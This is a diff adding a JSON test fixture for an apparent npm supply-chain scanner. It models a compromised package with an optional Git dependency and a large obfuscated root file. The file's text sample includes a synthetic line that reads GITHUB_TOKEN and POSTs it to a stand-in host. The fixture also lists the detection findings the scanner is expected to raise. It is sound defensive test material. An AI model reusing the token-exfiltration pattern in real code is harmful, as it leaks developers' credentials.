@@ -1,0 +1,111 @@
+{
+  "id": "tanstack-optional-git-payload",
+  "title": "TanStack-style optional Git dependency executes a root payload",
+  "category": "optional-git-lifecycle-payload",
+  "intent": "Model the key staged-artifact signals from the TanStack compromise without storing live malware: optional Git dependency, root payload, size anomaly, obfuscation, network, and credential access.",
+  "previousPackageJson": {
+    "name": "@example/router",
+    "version": "1.0.0",
+    "files": ["dist", "src"]
+  },
+  "stagedPackageJson": {
+    "name": "@example/router",
+    "version": "1.0.1",
+    "files": ["dist", "src"],
+    "optionalDependencies": {
+      "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"@example/router\",\"version\":\"1.0.0\",\"files\":[\"dist\",\"src\"]}"
+    },
+    {
+      "path": "dist/index.js",
+      "size": 800000,
+      "sha256": "dist-before",
+      "flags": [],
+      "textSample": "export default 1;\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 200,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"@example/router\",\"version\":\"1.0.1\",\"files\":[\"dist\",\"src\"],\"optionalDependencies\":{\"@tanstack/setup\":\"github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c\"}}"
+    },
+    {
+      "path": "dist/index.js",
+      "size": 800000,
+      "sha256": "dist-before",
+      "flags": [],
+      "textSample": "export default 1;\n"
+    },
+    {
+      "path": "router_init.js",
+      "size": 2341681,
+      "sha256": "router-init-synthetic",
+      "flags": [],
+      "textSample": "const _0x1111=_0x2222;\n(function(_0x3333,_0x4444){while(!![]){try{parseInt(_0x1111(0x123));break;}catch(e){}}})(_0x5555,0x123);\n_0xaaaa();_0xbbbb();_0xcccc();_0xdddd();_0xeeee();_0xffff();_0xabcd();_0xbcde();\nconst value = process.env.GITHUB_TOKEN;\nfetch('https://example.invalid/upload', { method: 'POST', body: value });\n"
+    }
+  ],
+  "expectedRisk": "critical",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "high",
+      "file": "router_init.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "router_init.js"
+    },
+    {
+      "ruleId": "code.obfuscated-large-js",
+      "severity": "high",
+      "file": "router_init.js"
+    },
+    {
+      "ruleId": "file.root-large-javascript",
+      "severity": "high",
+      "file": "router_init.js"
+    },
+    {
+      "ruleId": "file.outside-files-list",
+      "severity": "high",
+      "file": "router_init.js"
+    },
+    {
+      "ruleId": "package.size-anomaly",
+      "severity": "high",
+      "file": "package"
+    },
+    {
+      "ruleId": "diff.large-new-file",
+      "severity": "medium",
+      "file": "router_init.js"
+    },
+    {
+      "ruleId": "dependency.optional-added",
+      "severity": "high",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "dependency.optional-lifecycle-risk",
+      "severity": "critical",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "dependency.unusual-spec",
+      "severity": "high",
+      "file": "package.json"
+    }
+  ]
+}
